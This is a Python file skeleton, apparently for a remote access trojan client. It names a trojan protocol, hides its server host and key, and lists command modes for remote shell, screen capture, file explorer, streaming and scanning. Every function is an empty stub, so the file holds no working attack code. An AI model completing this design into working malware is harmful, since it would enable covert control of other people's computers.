# /* API */
from Api.config_packet import TCPConfigPacket, dumps, PACKET_ERROR, GetBlockPacket, new_key_xor
from Api.http_proto import use_http_proto
from Api.protocol import PACKET_TROJAN_PROTOCOL, OK
from socket import *
from os import urandom, getlogin
import binascii
import platform, base64
from time import sleep
import ctypes

HOST = "" #// hidden
KEY = "" #// hidden
MODE_PACKAGE = {
    0x1: "CONNECT",
    0x2: "PING",
    0x3: "SHELL",
    0x4: "SCREEN",
    0x5: "EXPLORER",
    0x6: "STREAMER",
    # not supported
    0x7: "SHELL-TER",
    # support
    0x8: "SCANNER",
    0x9: "SIGNAL"
}


class TcpConnect(TCPConfigPacket):
	
    def __init__(self):
		pass

    def tcp_create_socket(self):
		pass

    def tcp_connect(self, __socket_error=10060) -> int:
		pass

    def tcp_send_protocol_trojan(self):
		pass

    def tcp_set_setting(self):
		pass

    def tcp_send_packet(self, packet:bytes):
		pass

    def tcp_get_packet(self, enc=1):
		pass

    def __receive(self) -> bytes:
		pass

    def __send(self, packet:bytes) -> None:
		pass

    def tcp_close(self):
		pass

def get_setting_from_server() -> tuple | bool:
	pass

def get_privilege() -> int:
	pass

def get_platform():
	pass

def get_public_ip():
	pass


